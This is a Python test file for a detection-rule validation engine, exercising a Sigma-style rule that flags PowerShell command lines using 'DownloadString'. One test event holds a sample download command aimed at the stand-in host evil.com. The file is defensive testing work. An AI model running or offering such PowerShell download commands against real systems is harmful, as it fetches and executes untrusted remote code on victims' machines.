from app.validation.engine import run_safe_validation


RULE_CONTENT = """
title: Suspicious PowerShell Download
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains: 'DownloadString'
    condition: selection
"""


def test_matching_event_produces_pass():
    event = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "powershell.exe -c DownloadString('http://evil.com')",
    }
    result = run_safe_validation(RULE_CONTENT, event)
    assert result["verdict"] == "PASS"


def test_non_matching_event_produces_fail():
    event = {
        "Image": "C:\\Windows\\System32\\notepad.exe",
        "CommandLine": "notepad.exe myfile.txt",
    }
    result = run_safe_validation(RULE_CONTENT, event)
    assert result["verdict"] == "FAIL"


def test_irrelevant_event_produces_inconclusive():
    event = {
        "SomeOtherField": "nothing relevant here",
    }
    result = run_safe_validation(RULE_CONTENT, event)
    assert result["verdict"] == "INCONCLUSIVE"


def test_rule_with_no_selection_is_inconclusive():
    broken_rule = "title: Empty\ndetection:\n    condition: selection\n"
    result = run_safe_validation(broken_rule, {"Image": "test"})
    assert result["verdict"] == "INCONCLUSIVE"